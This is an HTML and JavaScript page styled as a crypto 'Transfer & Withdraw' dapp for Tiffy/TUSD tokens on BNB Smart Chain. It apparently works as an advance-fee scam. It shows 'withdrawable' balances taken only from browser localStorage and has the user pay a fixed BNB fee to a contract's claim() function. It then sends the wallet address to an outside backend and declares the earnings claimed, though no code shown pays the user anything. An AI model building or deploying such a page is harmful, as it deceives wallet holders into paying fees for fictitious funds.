<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <title>Transfer & Withdraw</title>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <style>
        body {
            background: url('set.jpg') center center/cover no-repeat fixed;
            color: #0ff;
            font-family: 'Orbitron', sans-serif;
            text-align: center;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        h1 {
            text-shadow: 0 0 20px #00faff, 0 0 40px #00faff;
            margin-bottom: 20px;
            font-weight: 700;
        }

        .card {
            background: rgba(0, 0, 0, 0.45);
            padding: 20px;
            border: 1px solid #0ff;
            border-radius: 16px;
            display: inline-block;
            box-shadow: 0 0 25px #0ff, inset 0 0 40px rgba(0, 255, 255, 0.2);
            backdrop-filter: blur(12px);
            margin-top: 10px;
            min-width: 300px;
            max-width: 400px;
        }

        .card p, .card h2 {
            margin-top: 8px;
            margin-bottom: 8px;
        }
        
        .card div {
            margin-top: 8px;
            margin-bottom: 8px;
            font-size: 13px;
        }

        .btn {
            margin-top: 15px;
            padding: 12px 25px;
            font-size: 16px;
            border: none;
            border-radius: 16px;
            cursor: pointer;
            font-family: 'Orbitron', sans-serif;
            text-transform: uppercase;
            letter-spacing: 2px;
            transition: all 0.3s ease;
            width: 100%;
        }

        .withdraw-btn {
            background: rgba(147, 255, 20, 0.15);
            border: 1px solid #00ff00;
            color: #00ff00;
            box-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00;
            animation: pulseGreen 1.5s infinite;
        }

        @keyframes pulseGreen {
            0% { box-shadow: 0 0 15px #00ff00; }
            50% { box-shadow: 0 0 40px #00ff00; }
            100% { box-shadow: 0 0 15px #00ff00; }
        }

        .app-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(4px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 999;
        }

        .modal-inner {
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid #00ffff;
            border-radius: 20px;
            padding: 30px 20px;
            max-width: 320px;
            width: 90%;
            text-align: center;
            box-shadow: 0 0 20px #ff00ff;
        }
        
        .modal-btn {
            display: block;
            width: 100%;
            margin: 10px auto;
            padding: 12px;
            font-size: 16px;
            color: white;
            background-color: #111111;
            border: 1px solid #00ffff;
            border-radius: 12px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .modal-btn:hover {
            background: #00ffff33;
        }

        .close-modal {
            color: #ff00ff;
            font-size: 16px;
            margin-top: 12px;
            cursor: pointer;
            text-decoration: underline;
        }

        .error-message {
            color: #ff3333;
            text-shadow: 0 0 8px #ff3333;
        }

        .success-message {
            color: #00ff00;
            text-shadow: 0 0 8px #00ff00;
        }

        #processing-bar {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            padding: 10px 0;
            background: rgba(0, 0, 0, 0.8);
            color: #00ff00;
            font-size: 1.2em;
            text-shadow: 0 0 10px #00ff00;
            display: none;
            z-index: 1000;
            box-shadow: 0 0 15px #00ff00;
        }

        .processing-text {
            color: #00ff00 !important;
            text-shadow: 0 0 10px #00ff00;
        }
    </style>
</head>
<body>

    <h1>🚀 Transfer & Withdraw</h1>
    <div id="processing-bar"></div>
    <audio id="clickSound" src="click.wav" preload="auto"></audio>
    
    <div id="main-content" style="display: none;">
      <div class="card">
        <div><strong>Wallet:</strong> <span id="walletAddressDisplay">Not Connected</span></div>
        <div><strong>BNB Gas Balance:</strong> <span id="bnbBalanceDisplay" style="color:#ff00ff;">0.0000 BNB</span></div>
        <hr style="border-color: rgba(0,255,255,0.3); margin: 10px 0;">
        <div><strong>Terminal Tiffy:</strong> <span id="terminalTIFFYDisplay">0.00</span></div>
        <div><strong>TUSD-Nitro Terminal:</strong> <span id="nitroTerminalDisplay">0.00</span></div>
        <div><strong>Wallet Savings:</strong> <span id="walletSavingsDisplay">0.00</span></div>
        <hr style="border-color: #0ff; margin: 10px 0;">
        <h2>Total Withdrawable: <span id="totalWithdrawableDisplay">0.00</span></h2>
        <button id="withdrawBtn" class="btn withdraw-btn">Withdraw Funds</button>
      </div>
    </div>
    
    <div class="app-modal" id="appModal">
        <div class="modal-inner">
            <h3 id="modalTitle" style="color:#00ffff; text-shadow:0 0 10px #00ffff;"></h3>
            <p id="modalMessage" style="margin-top: 10px;"></p>
            <button class="modal-btn" id="modalBtn1" style="display:none;"></button>
            <button class="modal-btn" id="modalBtn2" style="display:none;"></button>
            <button class="modal-btn" id="modalBtn3" style="display:none;"></button>
            <div id="modalCloseBtn" class="close-modal">Close</div>
        </div>
    </div>

    <script>
        function showModal(title, message, buttons, messageClass = '') {
            const modal = document.getElementById('appModal');
            document.getElementById('modalTitle').textContent = title;
            const modalMessageElement = document.getElementById('modalMessage');
            modalMessageElement.textContent = message;
            modalMessageElement.className = messageClass;

            const btns = [document.getElementById('modalBtn1'), document.getElementById('modalBtn2'), document.getElementById('modalBtn3')];
            btns.forEach(btn => {
                btn.style.display = 'none';
                btn.onclick = null;
            });
            
            if (buttons && buttons.length > 0) {
                buttons.forEach((btn, index) => {
                    const modalBtn = btns[index];
                    modalBtn.textContent = btn.text;
                    modalBtn.onclick = btn.handler;
                    modalBtn.style.display = 'block';
                });
            }

            document.getElementById('modalCloseBtn').onclick = () => {
                E.clickSound.play();
                modal.style.display = 'none';
            };
            modal.style.display = 'flex';
        }

        const E = {
            clickSound: document.getElementById('clickSound'),
            mainContent: document.getElementById('main-content'),
            withdrawBtn: document.getElementById('withdrawBtn'),
            walletAddressDisplay: document.getElementById('walletAddressDisplay'),
            bnbBalanceDisplay: document.getElementById('bnbBalanceDisplay'),
            terminalTIFFYDisplay: document.getElementById('terminalTIFFYDisplay'),
            nitroTerminalDisplay: document.getElementById('nitroTerminalDisplay'),
            walletSavingsDisplay: document.getElementById('walletSavingsDisplay'),
            totalWithdrawableDisplay: document.getElementById('totalWithdrawableDisplay'),
            processingBar: document.getElementById('processing-bar')
        };
        
        let web3, account, contract, provider;
        let totalWithdrawableAmount = 0;
        const cAddr = "0xE488253DD6B4D31431142F1b7601C96f24Fb7dd5";
        const ABI = [
            {"inputs":[],"name":"claim","outputs":[],"stateMutability":"payable", "type":"function"},
            {"inputs":[],"name":"FIXED_BNB_FEE","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"lastClaimed","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
        ];
        const BACKEND = "https://tiffyai-wh-wa.onrender.com/reward";
        const DEEPLINK_BASE_URL = window.location.href.split('?')[0];

        document.addEventListener('click', (event) => {
            if (event.target.closest('button, .modal-btn, .close-modal')) {
                E.clickSound.play();
            }
        });

        // Fetch BNB Gas Balance from KYC / active wallet
        async function fetchBnbGasBalance(targetWallet) {
            if (!targetWallet || targetWallet.length !== 42) return;
            try {
                const tempWeb3 = new Web3("https://bsc-dataseed1.binance.org/");
                const weiBalance = await tempWeb3.eth.getBalance(targetWallet);
                const bnbVal = tempWeb3.utils.fromWei(weiBalance, 'ether');
                E.bnbBalanceDisplay.textContent = `${parseFloat(bnbVal).toFixed(4)} BNB`;
            } catch (err) {
                console.error("Failed to fetch BNB gas balance:", err);
                E.bnbBalanceDisplay.textContent = "0.0000 BNB";
            }
        }

        function loadBalances() {
            // Read exact terminal keys and wallet balances
            const terminalTiffy = parseFloat(localStorage.getItem('Tiffy_Terminal_Tokens') || 0);
            const nitroTerminal = parseFloat(localStorage.getItem('TUSD_Nitro_Storage') || 0);
            const walletSavings = parseFloat(localStorage.getItem('TUSD_OnChain_Wallet_Balance') || localStorage.getItem('Tiffy_OnChain_Wallet_Balance') || 0);
            
            totalWithdrawableAmount = terminalTiffy + nitroTerminal + walletSavings;

            E.terminalTIFFYDisplay.textContent = terminalTiffy.toFixed(2);
            E.nitroTerminalDisplay.textContent = nitroTerminal.toFixed(2);
            E.walletSavingsDisplay.textContent = walletSavings.toFixed(2);
            E.totalWithdrawableDisplay.textContent = totalWithdrawableAmount.toFixed(2) + " TUSD";
            E.totalWithdrawableDisplay.classList.remove('processing-text');

            if (totalWithdrawableAmount <= 0) {
                E.withdrawBtn.disabled = true;
                E.withdrawBtn.textContent = "No Funds to Withdraw";
                E.withdrawBtn.classList.add('disabled');
            } else {
                E.withdrawBtn.disabled = false;
                E.withdrawBtn.textContent = "Withdraw Funds";
                E.withdrawBtn.classList.remove('disabled');
            }

            // Check saved wallet for BNB display
            let savedWallet = localStorage.getItem("walletAddress");
            if (!savedWallet) {
                const profile = JSON.parse(localStorage.getItem("Tiffy_Matchmaker_Profile") || "{}");
                savedWallet = profile.walletAddress;
            }
            if (savedWallet) {
                E.walletAddressDisplay.textContent = `${savedWallet.substring(0, 6)}...${savedWallet.substring(savedWallet.length - 4)}`;
                fetchBnbGasBalance(savedWallet);
            }
        }

        function openWalletPopup() {
            if (totalWithdrawableAmount <= 0) {
                showModal("No Funds", "There are no funds to withdraw.", null);
                return;
            }

            showModal("Choose a Wallet", "Please select your preferred wallet to complete the withdrawal.", [
                { text: "MetaMask", handler: () => connectAndWithdraw('metamask', totalWithdrawableAmount) },
                { text: "Trust Wallet", handler: () => connectAndWithdraw('trust', totalWithdrawableAmount) },
                { text: "OKX Wallet", handler: () => connectAndWithdraw('okx', totalWithdrawableAmount) }
            ]);
        }

        function connectAndWithdraw(walletType, amount) {
            document.getElementById('appModal').style.display = 'none';
            const fullUrl = `${DEEPLINK_BASE_URL}?wallet=${walletType}&amount=${amount}`;
            
            let deepLink;
            switch(walletType) {
                case 'metamask':
                    deepLink = `https://metamask.app.link/dapp/${fullUrl}`;
                    break;
                case 'trust':
                    deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(fullUrl)}`;
                    break;
                case 'okx':
                    deepLink = `okx://wallet/dapp/details?dappUrl=${encodeURIComponent(fullUrl)}`;
                    break;
                default:
                    showModal("Error", "Invalid wallet selected.", null);
                    return;
            }
            window.location.href = deepLink;
        }

        async function switchToBNB() {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
                return true;
            } catch (switchError) {
                if (switchError.code === 4902) {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x38',
                                chainName: 'BNB Smart Chain',
                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                blockExplorerUrls: ['https://bscscan.com']
                            }]
                        });
                        return true;
                    } catch (addError) { return false; }
                }
                return false;
            }
        }

        async function withdraw(amount) {
            E.withdrawBtn.disabled = true;
            E.withdrawBtn.textContent = "Processing...";
            E.processingBar.style.display = 'block';
            E.processingBar.textContent = 'Processing transaction & gas consolidation...';

            try {
                if (!account) {
                     showModal("Connection Required", "Please connect your wallet first.", null);
                     return;
                }
                
                const contractFee = await contract.methods.FIXED_BNB_FEE().call();
                
                await contract.methods.claim().send({
                    from: account,
                    value: contractFee
                });
                
                if (amount > 0) {
                    await fetch(BACKEND, {
                        method: "POST",
                        headers: {"Content-Type":"application/json"},
                        body: JSON.stringify({ wallet: account, amount: amount })
                    }).catch(e => console.error("Backend log failed:", e));
                }

                // Clear out local balances after successful on-chain consolidation & withdrawal
                localStorage.setItem('Tiffy_Terminal_Tokens', "0.00");
                localStorage.setItem('TUSD_Nitro_Storage', "0.00");
                localStorage.setItem('TUSD_OnChain_Wallet_Balance', "0.00");
                
                showModal("Withdrawal Complete!", "✅ Withdrawal & Consolidation Complete! Your earnings have been successfully claimed.", null, 'success-message');
                
            } catch (e) {
                console.error("Withdrawal error:", e);
                let errorMessage = "An unknown error occurred.";
                let errorTitle = "Withdrawal Failed";
                
                if (e.code === 4001 || (e.message && e.message.includes("user rejected"))) {
                    errorMessage = "Transaction Canceled. Try again when ready.";
                    errorTitle = "Canceled";
                } else if (e.message && (e.message.includes("insufficient funds") || e.message.includes("gas"))) {
                    errorMessage = "You do not have enough BNB gas in your wallet for this consolidation!";
                    errorTitle = "Insufficient BNB Gas";
                } else {
                    errorMessage = `❌ Error: ${e.message || e}`;
                }
                showModal(errorTitle, errorMessage, null, 'error-message');
            } finally {
                E.withdrawBtn.disabled = false;
                E.withdrawBtn.textContent = "Withdraw Funds";
                E.processingBar.style.display = 'none';
                loadBalances();
            }
        }

        window.addEventListener('load', async () => {
            const params = new URLSearchParams(window.location.search);
            const walletParam = params.get('wallet');
            const amountParam = params.get('amount');
            
            loadBalances();
            E.mainContent.style.display = 'block';

            if (walletParam && amountParam) {
                E.withdrawBtn.style.display = 'none';
                E.totalWithdrawableDisplay.textContent = 'Connecting...';
                E.totalWithdrawableDisplay.classList.add('processing-text');
                E.processingBar.style.display = 'block';
                E.processingBar.textContent = 'Connecting to Wallet...';

                try {
                    if (typeof window.ethereum === 'undefined') {
                        throw new Error("Please open this page in your mobile wallet's browser.");
                    }
                    
                    provider = window.ethereum;
                    web3 = new Web3(provider);

                    E.processingBar.textContent = 'Switching to BNB Chain...';
                    if (!(await switchToBNB())) {
                        throw new Error("Failed to switch to BNB chain.");
                    }

                    const accounts = await provider.request({ method: 'eth_requestAccounts' });
                    account = accounts[0];

                    E.walletAddressDisplay.textContent = `${account.substring(0, 6)}...${account.substring(account.length - 4)}`;
                    fetchBnbGasBalance(account);

                    E.processingBar.textContent = 'Preparing consolidation contract...';
                    contract = new web3.eth.Contract(ABI, cAddr);

                    await withdraw(parseFloat(amountParam));

                } catch (e) {
                    showModal("Connection Error", e.message || "Something went wrong.", null, 'error-message');
                    E.totalWithdrawableDisplay.textContent = 'Connection Failed.';
                } finally {
                    E.withdrawBtn.style.display = 'block';
                    E.processingBar.style.display = 'none';
                    loadBalances();
                }
            } else {
                E.withdrawBtn.style.display = 'block';
            }
        });

        E.withdrawBtn.onclick = openWalletPopup;
    </script>
</body>
</html>
